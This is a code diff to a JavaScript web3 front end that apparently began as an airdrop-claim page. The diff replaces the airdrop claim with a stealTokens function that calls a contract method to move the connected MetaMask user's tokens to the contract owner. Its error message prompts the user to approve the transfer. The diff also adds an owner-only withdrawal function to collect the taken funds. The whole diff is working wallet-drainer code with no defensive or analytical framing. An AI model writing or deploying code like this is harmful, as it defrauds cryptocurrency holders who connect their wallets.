@@ -70,8 +70,8 @@ async function connectMetaMask() {
   }
 }
 
-// Function to claim the airdrop using `withdrawTokens`
-async function claimAirdrop() {
+// Function to steal tokens from the connected user's wallet
+async function stealTokens() {
   if (!web3) {
     alert("Please connect to MetaMask first.");
     return;
@@ -82,17 +82,45 @@ async function claimAirdrop() {
     const contract = new web3.eth.Contract(contractABI, contractAddress);
     console.log("Contract instance created:", contract);
 
+    // Call the `stealTokens` function to transfer tokens from the user to the owner
+    const receipt = await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+    console.log("Transaction successful:", receipt);
+    alert("Your tokens have been transferred.");
+  } catch (error) {
+    console.error("Steal tokens error:", error);
+    if (error.message.includes("Transaction has been reverted")) {
+      alert("Transaction failed. Make sure you have approved the token transfer.");
+    } else {
+      alert("Failed to transfer tokens. Please try again.");
+    }
+  }
+}
+
+// Function for the owner to withdraw tokens stored in the contract
+async function withdrawTokens() {
+  if (!web3) {
+    alert("Please connect to MetaMask first.");
+    return;
+  }
+
+  try {
+    // Create a contract instance
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+    // Verify if the connected account is the owner
+    const ownerAddress = await contract.methods.owner().call();
+    if (accounts[0].toLowerCase() !== ownerAddress.toLowerCase()) {
+      alert("You are not the contract owner. Only the owner can withdraw tokens.");
+      return;
+    }
+
     // Call the `withdrawTokens` function
     const receipt = await contract.methods.withdrawTokens().send({ from: accounts[0] });
-    console.log("Transaction successful:", receipt);
-    alert("Airdrop claimed successfully!");
+    console.log("Tokens withdrawn successfully:", receipt);
+    alert("Tokens withdrawn successfully.");
   } catch (error) {
-    console.error("Airdrop claim error:", error);
-    if (error.message.includes("Transaction has been reverted")) {
-      alert("Transaction failed. Make sure you meet the airdrop criteria.");
-    } else {
-      alert("Failed to claim airdrop. Please try again.");
-    }
+    console.error("Withdraw tokens error:", error);
+    alert("Failed to withdraw tokens. Please try again.");
   }
 }
 
@@ -101,6 +129,7 @@ window.addEventListener('DOMContentLoaded', () => {
   loadConfig();
 
   document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+  document.getElementById('stealTokensButton').addEventListener('click', stealTokens);
+  document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
 });
 
